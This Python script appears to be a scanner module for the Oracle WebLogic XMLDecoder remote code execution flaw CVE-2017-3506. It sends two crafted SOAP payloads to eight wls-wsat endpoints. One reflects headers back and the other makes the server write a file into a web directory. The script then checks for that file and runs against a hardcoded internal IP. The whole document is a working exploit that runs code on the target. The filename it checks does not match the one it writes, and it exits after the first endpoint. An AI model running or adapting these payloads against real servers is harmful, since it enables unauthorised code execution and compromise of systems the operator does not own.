import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Oracle WebLogic Server 远程代码执行漏洞(CVE-2017-3506)'


def run(url):
    headers = {
    'Content-Type':'text/xml',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'h2': 'True',
    'h1': 'True'
    }
    host = urlparse(url)
    url = f"{host.scheme}://{host.netloc}"
    payload1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.lang.Thread" method="currentThread">
              <void method="getCurrentWork" id="current_work">
                <void method="getClass">
                  <void method="getDeclaredField">
                    <string>connectionHandler</string>
                    <void method="setAccessible">
                      <boolean>true</boolean>
                    </void>
                    <void method="get">
                      <object idref="current_work"></object>
                      <void method="getServletRequest">
                        <void method="getHeader" id="h1">
                          <string>h1</string>
                        </void>
                        <void method="getHeader" id="h2">
                          <string>h2</string>
                        </void>
                        <void method="getResponse">
                          <void method="getServletOutputStream">
                            <void method="writeStream">
                              <object class="weblogic.xml.util.StringInputStream">
                                <object idref="h1"></object>
                              </object>
                            </void>
                            <void method="writeStream">
                              <object class="weblogic.xml.util.StringInputStream">
                                <object idref="h2"></object>
                              </object>
                            </void>
                            <void method="flush"/>
                          </void>
                          <void method="getWriter">
                            <void method="write">
                              <string></string>
                            </void>
                          </void>
                        </void>
                      </void>
                    </void>
                  </void>
                </void>
              </void>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    payload2 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
              <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/__scantest.txt</string>
              <void method="println">
                <string>True</string>
              </void>
              <void method="close"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    
    for path in ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11','/wls-wsat/ParticipantPortType','/wls-wsat/ParticipantPortType11','/wls-wsat/RegistrationPortTypeRPC','/wls-wsat/RegistrationPortTypeRPC11','/wls-wsat/RegistrationRequesterPortType','/wls-wsat/RegistrationRequesterPortType11']:
        vulurl = url + path
        try:
            requests.post(vulurl, headers=headers, data=payload1, timeout=15, verify=False)
            requests.post(vulurl, headers=headers, data=payload2, timeout=15, verify=False)
            response = requests.get(f'{url}/bea_wls_internal/_scantest.txt', headers=headers, timeout=15, verify=False)
            if 'True' in response.text:
                return ['True',name,vulurl]
            else:
                return ['False',name]
        except Exception as e:
            return ['False',name]

if __name__ == '__main__':
    url = 'http://10.195.177.130:7001/'
    print(run(url))